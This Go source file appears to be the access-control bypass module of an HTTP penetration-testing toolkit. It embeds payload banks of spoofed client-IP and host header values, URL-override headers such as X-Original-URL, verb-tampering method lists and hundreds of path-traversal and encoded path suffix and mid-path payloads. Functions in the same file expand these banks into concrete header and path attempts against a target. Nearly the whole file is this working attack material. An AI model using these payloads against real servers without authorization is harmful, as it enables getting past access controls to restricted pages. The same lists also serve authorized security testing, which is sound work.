package bypass

import (
	"fmt"
	"path/filepath"
	"strings"

	"github.com/aether-0/httpsuite/pkg/utils"
)

// Embedded payloads - no external files needed

// HeaderPayload represents a header-based bypass attempt.
type HeaderPayload struct {
	Key   string
	Value string
}

// BypassIPValues contains the current upstream-style IP/host variants used for header bypassing.
var BypassIPValues = []string{
	"*",
	"0",
	"0.0.0.0",
	"0177.0000.0000.0001",
	"0177.1",
	"0x7F000001",
	"10.0.0.0",
	"10.0.0.1",
	"127.0.0.1",
	"127.0.0.1:443",
	"127.0.0.1:80",
	"127.1",
	"172.16.0.0",
	"172.16.0.1",
	"172.17.0.1",
	"192.168.0.2",
	"192.168.1.0",
	"192.168.1.1",
	"2130706433",
	"8.8.8.8",
	"localhost",
	"localhost:443",
	"localhost:80",
	"norealhost",
	"null",
}

var pathHeaderKeys = []string{
	"Request-Uri",
	"Uri",
	"X-Original-URL",
	"X-Override-URL",
	"X-Rewrite-URL",
}

var urlHeaderKeys = []string{
	"Base-Url",
	"Destination",
	"Http-Url",
	"Profile",
	"Proxy-Url",
	"Redirect",
	"Referer",
	"Referrer",
	"Url",
	"X-HTTP-DestinationURL",
	"X-Proxy-Url",
	"X-Proxy-URL",
	"X-Referrer",
	"X-WAP-Profile",
}

var originHeaderKeys = []string{
	"Access-Control-Allow-Origin",
	"Origin",
}

var ipHeaderKeys = []string{
	"CF-Connecting-IP",
	"CF-Connecting_IP",
	"Client-IP",
	"Forwarded-For",
	"Forwarded-For-Ip",
	"Real-Ip",
	"True-Client-IP",
	"X-Arbitrary",
	"X-Client-IP",
	"X-Custom-IP-Authorization",
	"X-Forward",
	"X-Forward-For",
	"X-Forwarded",
	"X-Forwarded-By",
	"X-Forwarded-For",
	"X-Forwarded-For-Original",
	"X-Original-Remote-Addr",
	"X-Originally-Forwarded-For",
	"X-Originating-IP",
	"X-ProxyUser-Ip",
	"X-Real-IP",
	"X-Real-Ip",
	"X-Remote-Addr",
	"X-Remote-IP",
	"X-True-IP",
}

var hostHeaderKeys = []string{
	"Proxy-Host",
	"X-Forwarded-Host",
	"X-Forwarded-Server",
	"X-Host",
	"X-HTTP-Host-Override",
	"X-Original-Host",
}

var portHeaderValues = []string{
	"80",
	"443",
	"4443",
	"8080",
	"8443",
}

var protoHeaderValues = []string{
	"http",
	"https",
}

var staticHeaderPayloads = []HeaderPayload{
	{Key: "Content-Length", Value: "0"},
	{Key: "X-HTTP-Method-Override", Value: "POST"},
	{Key: "X-HTTP-Method-Override", Value: "PUT"},
	{Key: "X-Original-Method", Value: "GET"},
	{Key: "X-Requested-With", Value: "XMLHttpRequest"},
}

// HTTPMethods contains methods to try for verb tampering.
var HTTPMethods = []string{
	"GET",
	"POST",
	"PUT",
	"DELETE",
	"PATCH",
	"HEAD",
	"OPTIONS",
	"TRACE",
	"CONNECT",
	"COPY",
	"LOCK",
	"MOVE",
	"LABEL",
	"UPDATE",
	"TRACK",
	"UNLOCK",
	"SEARCH",
	"PROPFIND",
	"PROPPATCH",
	"MKCOL",
	"REPORT",
	"CHECKOUT",
	"CHECKIN",
	"UNCHECKOUT",
	"VERSION-CONTROL",
	"MKWORKSPACE",
	"MERGE",
	"ACL",
	"ORDERPATCH",
	"PURGE",
}

// HTTPVersions contains raw protocol versions to test directly against the origin.
var HTTPVersions = []string{
	"1.0",
	"1.1",
}

// EndPathPayloads contains suffixes to append to paths.
var EndPathPayloads = []string{
	"?",
	"??",
	"/",
	"//",
	"/.",
	"/./",
	"/..;/",
	"..\\;/",
	"..;/",
	"~",
	"°/",
	"#",
	"#/",
	"#/./",
	"#test",
	"%00",
	"%09",
	"%0A",
	"%0D",
	"%20",
	"%20/",
	"%25",
	"%23",
	"%26",
	"%3f",
	"%61",
	"%2500",
	"%2509",
	"%250A",
	"%250D",
	"%2520",
	"%2520%252F",
	"%2525",
	"%2523",
	"%2526",
	"%253F",
	"%2561",
	"&",
	"-",
	".",
	"..;",
	"..\\;",
	"./",
	".css",
	".html",
	".json",
	".php",
	".random",
	".svc",
	".svc?wsdl",
	".wsdl",
	"0",
	"1",
	"???",
	"?WSDL",
	"?debug=1",
	"?debug=true",
	"?param",
	"?testparam",
	"\\/\\/",
	"debug",
	"false",
	"null",
	"true",
	"/..%3B/",
	"/*",
	";%2f..%2f..%2f",
	"?&",
	"..",
	";/",
}

// MidPathPayloads contains payloads to insert in the middle of paths.
var MidPathPayloads = []string{
	"#",
	"#?",
	"%",
	"%09",
	"%09%3b",
	"%09..",
	"%09;",
	"%20",
	"%20/",
	"%23",
	"%23%3f",
	"%252f%252f",
	"%252f/",
	"%26",
	"%2e",
	"%2e%2e",
	"%2e%2e%2f",
	"%2e%2e/",
	"%2e/",
	"%2f",
	"%2f%20%23",
	"%2f%23",
	"%2f%2f",
	"%2f%3b%2f",
	"%2f%3b%2f%2f",
	"%2f%3f",
	"%2f%3f/",
	"%2f/",
	"%3b",
	"%3b%09",
	"%3b%2f%2e%2e",
	"%3b%2f%2e%2e%2f%2e%2e%2f%2f",
	"%3b%2f%2e.",
	"%3b%2f..",
	"%3b/%2e%2e/..%2f%2f",
	"%3b/%2e.",
	"%3b/%2f%2f../",
	"%3b/..",
	"%3b//%2f../",
	"%3f",
	"%3f%23",
	"%3f%3f",
	"&",
	".%2e/",
	"..",
	"..%00/",
	"..%00/;",
	"..%00;/",
	"..%09",
	"..%0d/",
	"..%0d/;",
	"..%0d;/",
	"..%2f",
	"..%3B",
	"..%5c",
	"..%5c/",
	"..%ff",
	"..%ff/;",
	"..%ff;/",
	"../",
	".././",
	"..;",
	"..;%00/",
	"..;%0d/",
	"..;%ff/",
	"..;/",
	"..;\\;",
	"..;\\\\",
	"..\\;",
	"..\\\\",
	"./",
	"./.",
	".//./",
	".;/",
	".\\;/",
	".html",
	".json",
	"/",
	"/%20#",
	"/%20%20/",
	"/%20%23",
	"/%252e%252e%252f/",
	"/%252e%252e%253b/",
	"/%252e%252f/",
	"/%252e%253b/",
	"/%252e/",
	"/%252f",
	"/%2e%2e",
	"/%2e%2e%3b/",
	"/%2e%2e/",
	"/%2e%2f/",
	"/%2e%3b/",
	"/%2e%3b//",
	"/%2e/",
	"/%2e//",
	"/%2f",
	"/%3b/",
	"/*",
	"/*/",
	"/.",
	"/..",
	"/..%2f",
	"/./..%2f",
	"/..%2f..%2f",
	"/..%2f..%2f..%2f",
	"/..%252F",
	"/./..%252F",
	"/../",
	"/../../",
	"/../../../",
	"/../../..//",
	"/../..//",
	"/../..//../",
	"/../..;/",
	"/.././../",
	"/../.;/../",
	"/..//",
	"/..//../",
	"/..//../../",
	"/..//..;/",
	"/../;/",
	"/../;/../",
	"/..;%2f",
	"/..;%2f..;%2f",
	"/..;%2f..;%2f..;%2f",
	"/..;/",
	"/..;/../",
	"/..;/..;/",
	"/..;//",
	"/..;//../",
	"/..;//..;/",
	"/..;/;/",
	"/..;/;/..;/",
	"/./",
	"/.//",
	"/.;/",
	"/.;//",
	"/.randomstring",
	"//",
	"//.",
	"//..",
	"//../../",
	"//..;",
	"//./",
	"//.;/",
	"///..",
	"///../",
	"///..//",
	"///..;",
	"///..;/",
	"///..;//",
	"////",
	"//;/",
	"//?anything",
	"/;/",
	"/;//",
	"/;x",
	"/;x/",
	"/x/../",
	"/x/..//",
	"/x/../;/",
	"/x/..;/",
	"/x/..;//",
	"/x/..;/;/",
	"/x//../",
	"/x//..;/",
	"/x/;/../",
	"/x/;/..;/",
	";",
	";%09",
	";%09..",
	";%09..;",
	";%09;",
	";%2f%2e%2e",
	";%2f%2e%2e%2f%2e%2e%2f%2f",
	";%2f%2f/../",
	";%2f..",
	";%2f..%2f%2e%2e%2f%2f",
	";%2f..%2f..%2f%2f",
	";%2f..%2f/",
	";%2f..%2f/..%2f",
	";%2f..%2f/../",
	";%2f../%2f..%2f",
	";%2f../%2f../",
	";%2f..//..%2f",
	";%2f..//../",
	";%2f..///",
	";%2f..///;",
	";%2f..//;/",
	";%2f..//;/;",
	";%2f../;//",
	";%2f../;/;/",
	";%2f../;/;/;",
	";%2f..;///",
	";%2f..;//;/",
	";%2f..;/;//",
	";%2f/%2f../",
	";%2f//..%2f",
	";%2f//../",
	";%2f//..;/",
	";%2f/;/../",
	";%2f/;/..;/",
	";%2f;//../",
	";%2f;/;/..;/",
	";/%2e%2e",
	";/%2e%2e%2f%2f",
	";/%2e%2e%2f/",
	";/%2e%2e/",
	";/%2e.",
	";/%2f%2f../",
	";/%2f/..%2f",
	";/%2f/../",
	";/.%2e",
	";/.%2e/%2e%2e/%2f",
	";/..",
	";/..%2f",
	";/..%2f%2f../",
	";/..%2f..%2f",
	";/..%2f/",
	";/..%2f//",
	";/../",
	";/../%2f/",
	";/../../",
	";/../..//",
	";/.././../",
	";/../.;/../",
	";/..//",
	";/..//%2e%2e/",
	";/..//%2f",
	";/..//../",
	";/..///",
	";/../;/",
	";/../;/../",
	";/..;",
	";/.;.",
	";//%2f../",
	";//..",
	";//../../",
	";///..",
	";///../",
	";///..//",
	";foo=bar/",
	";x",
	";x/",
	";x;",
	"?",
	"??",
	"???",
	"\\..\\.\\",
}

// BuildHeaderPayloads expands the current bypass header banks into concrete key/value attempts.
func BuildHeaderPayloads(targetURL, path, host, scheme, bypassIP string) []HeaderPayload {
	return BuildHeaderPayloadsForDir("", targetURL, path, host, scheme, bypassIP)
}

// HTTPMethodsForDir returns embedded methods plus any synced overrides found in payloadDir.
func HTTPMethodsForDir(payloadDir string) []string {
	return loadBypassList(payloadDir, "httpmethods", HTTPMethods)
}

// EndPathPayloadsForDir returns embedded suffix payloads plus any synced overrides found in payloadDir.
func EndPathPayloadsForDir(payloadDir string) []string {
	return loadBypassList(payloadDir, "endpaths", EndPathPayloads)
}

// MidPathPayloadsForDir returns embedded mid-path payloads plus any synced overrides found in payloadDir.
func MidPathPayloadsForDir(payloadDir string) []string {
	return loadBypassList(payloadDir, "midpaths", MidPathPayloads)
}

// BuildHeaderPayloadsForDir expands embedded and synced header banks into concrete key/value attempts.
func BuildHeaderPayloadsForDir(payloadDir, targetURL, path, host, scheme, bypassIP string) []HeaderPayload {
	payloads := make([]HeaderPayload, 0, 256)
	seen := make(map[string]struct{}, 256)

	ipValues := loadBypassList(payloadDir, "ips", BypassIPValues)
	if bypassIP != "" {
		ipValues = []string{bypassIP}
	}

	hostValues := []string{host, "localhost", "127.0.0.1"}
	if bypassIP != "" {
		hostValues = append([]string{bypassIP}, hostValues...)
	}

	fullOrigin := scheme + "://" + host

	add := func(key, value string) {
		if key == "" || value == "" {
			return
		}
		signature := key + "\x00" + value
		if _, ok := seen[signature]; ok {
			return
		}
		seen[signature] = struct{}{}
		payloads = append(payloads, HeaderPayload{Key: key, Value: value})
	}

	for _, key := range headerKeysForDir(payloadDir) {
		for _, value := range candidateValuesForHeader(key, targetURL, path, fullOrigin, hostValues, ipValues) {
			add(key, value)
		}
	}

	for _, value := range portHeaderValues {
		add("X-Forwarded-Port", value)
	}

	for _, value := range protoHeaderValues {
		add("X-Forwarded-Proto", value)
		add("X-Forwarded-Scheme", value)
	}

	if len(ipValues) > 0 {
		add("Forwarded", fmt.Sprintf("for=%s;by=%s;host=%s", ipValues[0], ipValues[0], host))
	}

	for _, payload := range staticHeaderPayloads {
		add(payload.Key, payload.Value)
	}

	for _, payload := range simpleHeaderPayloadsForDir(payloadDir, path) {
		add(payload.Key, payload.Value)
	}

	return payloads
}

func loadBypassList(payloadDir, name string, fallback []string) []string {
	if payloadDir == "" {
		return fallback
	}

	filePath := filepath.Join(payloadDir, "bypass", name)
	if !utils.PathExists(filePath) {
		return fallback
	}

	lines, err := utils.ReadLines(filePath)
	if err != nil || len(lines) == 0 {
		return fallback
	}

	return utils.UniqueStrings(append(lines, fallback...))
}

func headerKeysForDir(payloadDir string) []string {
	fallback := append([]string{}, pathHeaderKeys...)
	fallback = append(fallback, urlHeaderKeys...)
	fallback = append(fallback, originHeaderKeys...)
	fallback = append(fallback, ipHeaderKeys...)
	fallback = append(fallback, hostHeaderKeys...)
	fallback = utils.UniqueStrings(fallback)
	return loadBypassList(payloadDir, "headers", fallback)
}

func simpleHeaderPayloadsForDir(payloadDir, path string) []HeaderPayload {
	payloads := make([]HeaderPayload, 0, 8)

	if payloadDir == "" {
		return payloads
	}

	filePath := filepath.Join(payloadDir, "bypass", "simpleheaders")
	if !utils.PathExists(filePath) {
		return payloads
	}

	lines, err := utils.ReadLines(filePath)
	if err != nil {
		return payloads
	}

	for _, line := range lines {
		parts := strings.Fields(line)
		if len(parts) < 2 {
			continue
		}

		value := strings.Join(parts[1:], " ")
		payloads = append(payloads, HeaderPayload{
			Key:   parts[0],
			Value: value,
		})

		if path != "" && value == "/admin" && value != path {
			payloads = append(payloads, HeaderPayload{
				Key:   parts[0],
				Value: path,
			})
		}
	}

	return payloads
}

func candidateValuesForHeader(key, targetURL, path, fullOrigin string, hostValues, ipValues []string) []string {
	switch {
	case containsHeaderKey(pathHeaderKeys, key):
		return []string{path}
	case containsHeaderKey(urlHeaderKeys, key):
		return []string{targetURL}
	case containsHeaderKey(originHeaderKeys, key):
		return []string{fullOrigin}
	case containsHeaderKey(ipHeaderKeys, key):
		return ipValues
	case containsHeaderKey(hostHeaderKeys, key):
		return hostValues
	}

	lowerKey := strings.ToLower(key)
	switch {
	case strings.Contains(lowerKey, "origin"):
		return []string{fullOrigin}
	case strings.Contains(lowerKey, "url"),
		strings.Contains(lowerKey, "uri"),
		strings.Contains(lowerKey, "refer"),
		strings.Contains(lowerKey, "destination"),
		strings.Contains(lowerKey, "profile"),
		lowerKey == "proxy":
		return []string{path, targetURL}
	case strings.Contains(lowerKey, "host"),
		strings.Contains(lowerKey, "server"):
		return hostValues
	case strings.Contains(lowerKey, "ip"),
		strings.Contains(lowerKey, "forward"),
		strings.Contains(lowerKey, "client"):
		return ipValues
	default:
		return []string{targetURL, path}
	}
}

func containsHeaderKey(keys []string, target string) bool {
	for _, key := range keys {
		if strings.EqualFold(key, target) {
			return true
		}
	}
	return false
}
